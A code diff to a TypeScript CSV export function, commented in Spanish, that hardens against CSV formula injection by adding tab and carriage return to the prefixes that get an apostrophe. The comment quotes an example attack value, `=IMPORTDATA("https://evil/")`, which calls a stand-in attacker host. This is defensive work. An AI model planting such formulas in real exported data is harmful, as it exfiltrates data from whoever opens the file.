@@ -6,11 +6,12 @@
  *   - Cualquier valor con coma, comilla doble, salto de línea o CR se
  *     envuelve en comillas dobles.
  *   - Las comillas dobles dentro del valor se duplican (`"` → `""`).
- *   - Prefijo CSV injection: si el valor empieza con `=`, `+`, `-` o `@`,
- *     anteponemos un apóstrofe para que Excel/LibreOffice no lo evalúen
- *     como fórmula DDE (vector OWASP de exfiltración: un cliente con
- *     nombre `=IMPORTDATA("https://evil/")` ejecuta esa fórmula al abrir
- *     el CSV el owner).
+ *   - Prefijo CSV injection: si el valor empieza con `=`, `+`, `-`, `@`,
+ *     tab o CR, anteponemos un apóstrofe para que Excel/LibreOffice no lo
+ *     evalúen como fórmula DDE (vector OWASP de exfiltración: un cliente
+ *     con nombre `=IMPORTDATA("https://evil/")` ejecuta esa fórmula al
+ *     abrir el CSV el owner). LibreOffice también dispara con `\t` y `\r`
+ *     al inicio según OWASP.
  *
  * Encoding: agregamos BOM UTF-8 al inicio para que Excel detecte UTF-8
  * y abra correctamente tildes y ñ. Sin BOM, Excel asume Windows-1252 y
@@ -19,7 +20,7 @@
 
 const BOM = "﻿";
 
-const FORMULA_PREFIXES = new Set(["=", "+", "-", "@"]);
+const FORMULA_PREFIXES = new Set(["=", "+", "-", "@", "\t", "\r"]);
 
 function escapeCell(value: unknown): string {
   if (value === null || value === undefined) return "";
